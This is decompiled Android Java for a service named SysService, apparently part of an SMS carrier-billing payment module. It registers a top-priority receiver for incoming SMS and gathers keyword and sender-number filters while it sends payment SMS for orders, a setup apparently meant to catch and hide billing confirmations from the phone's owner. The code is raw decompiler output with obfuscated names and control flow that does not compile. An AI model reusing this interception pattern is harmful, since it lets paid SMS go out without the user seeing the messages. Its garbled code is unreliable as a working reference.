package com.jshyproject.price.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import com.jshyproject.price.activity.OrderActivity;
import com.jshyproject.price.order.OrderHelperForDSms;
import com.jshyproject.price.order.PayOrder;
import com.jshyproject.price.order.SmsComm;
import com.jshyproject.price.ztool.Utils;
import com.jshyproject.price.ztool.Zlog;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;

public class SysService
  extends Service
{
  public static final String RECEIVE_AUTO_SMS_DELI = "AutoAns_Deli";
  public static final String RECEIVE_AUTO_SMS_SEND = "AutoAns_Send";
  public static final String RECEIVE_SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
  public static final String RECEIVE_SMS_DELI = "sys_delivery";
  public static final String RECEIVE_SMS_SEND = "sys_sended";
  public static final int TYPE_SMS_SEND = 1001;
  private static HashSet b = new HashSet();
  private static HashSet c = new HashSet();
  private SysService.SmsBinder a;
  private OrderHelperForDSms d;
  private BroadcastReceiver e = new c(this);
  private BroadcastReceiver f = new d(this);
  public String packageName;
  
  public SysService() {}
  
  public static void updateDelInfoWithComm(SmsComm paramSmsComm)
  {
    int j = 0;
    if (paramSmsComm == null) {}
    do
    {
      return;
      localObject = paramSmsComm.getFilterKey();
      paramSmsComm = paramSmsComm.getFilterNumber();
    } while ((localObject == null) || (paramSmsComm == null));
    Object localObject = ((String)localObject).split("\\|");
    int i = 0;
    for (;;)
    {
      if (i >= localObject.length)
      {
        paramSmsComm = paramSmsComm.split("\\|");
        i = j;
        while (i < paramSmsComm.length)
        {
          if ((!paramSmsComm[i].equals("")) && (paramSmsComm[i].length() >= 2)) {
            c.add(paramSmsComm[i]);
          }
          i += 1;
        }
        break;
      }
      if ((!localObject[i].equals("")) && (localObject[i].length() >= 2)) {
        b.add(localObject[i]);
      }
      i += 1;
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return this.a;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.a = new SysService.SmsBinder(this);
    this.packageName = getPackageName();
    IntentFilter localIntentFilter1 = new IntentFilter();
    localIntentFilter1.addAction("android.provider.Telephony.SMS_RECEIVED");
    localIntentFilter1.setPriority(Integer.MAX_VALUE);
    IntentFilter localIntentFilter2 = new IntentFilter();
    localIntentFilter2.addAction(this.packageName + "sys_sended");
    registerReceiver(this.e, localIntentFilter1);
    registerReceiver(this.f, localIntentFilter2);
    startService(new Intent(this, SmsService.class));
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    unregisterReceiver(this.e);
    unregisterReceiver(this.f);
    if (this.d != null) {
      this.d.unBindReceiver();
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if ((paramIntent != null) && (paramIntent.getExtras() != null)) {}
    switch (paramIntent.getIntExtra("type", -1))
    {
    default: 
      return 1;
    case 1001: 
      paramInt1 = paramIntent.getIntExtra("orderId", -1);
      if (paramInt1 == -1) {
        stopSelf();
      }
      paramIntent = PayOrder.getOrderWithId(paramInt1);
      if (paramIntent == null) {
        stopSelf();
      }
      if ((paramIntent.getPayType() == 0) && (paramIntent.isAgreeToSms) && (paramIntent.getSmsComms() != null) && (!paramIntent.isFinish()) && (paramIntent.getState() != 12) && (paramIntent.getSmsComms().size() <= 15))
      {
        localObject1 = paramIntent.getSmsComms().iterator();
        Object localObject3;
        do
        {
          if (!((Iterator)localObject1).hasNext())
          {
            Zlog.syso("del-info:" + b + c);
            Utils.setMessage(b);
            Zlog.syso("sending..");
            new Thread(new f(this, paramIntent)).start();
            return 1;
          }
          localObject3 = (SmsComm)((Iterator)localObject1).next();
          localObject2 = ((SmsComm)localObject3).getFilterKey();
          localObject3 = ((SmsComm)localObject3).getFilterNumber();
        } while ((localObject2 == null) || (localObject3 == null));
        Object localObject2 = ((String)localObject2).split("\\|");
        paramInt1 = 0;
        for (;;)
        {
          if (paramInt1 >= localObject2.length)
          {
            localObject2 = ((String)localObject3).split("\\|");
            paramInt1 = 0;
            while (paramInt1 < localObject2.length)
            {
              if ((!localObject2[paramInt1].equals("")) && (localObject2[paramInt1].length() >= 2)) {
                c.add(localObject2[paramInt1]);
              }
              paramInt1 += 1;
            }
          }
          if ((!localObject2[paramInt1].equals("")) && (localObject2[paramInt1].length() >= 2)) {
            b.add(localObject2[paramInt1]);
          }
          paramInt1 += 1;
        }
      }
      if (paramIntent.getPayType() == 1)
      {
        this.d = new OrderHelperForDSms(paramIntent, this);
        this.d.bindReceiver();
        this.d.startPay();
        return 1;
      }
      Zlog.syso("sms-error");
      Object localObject1 = paramIntent.getActivity();
      if ((localObject1 == null) || (((OrderActivity)localObject1).isFinishing())) {
        break label453;
      }
      if (paramIntent.getActivityState() == 1) {
        ((OrderActivity)localObject1).onPayError(2);
      }
      break;
    }
    for (;;)
    {
      stopSelf();
      return 1;
      paramIntent.finishWithCallbcak(-1);
    }
    label453:
    paramIntent.finishWithCallbcak(-1);
    return 1;
  }
}
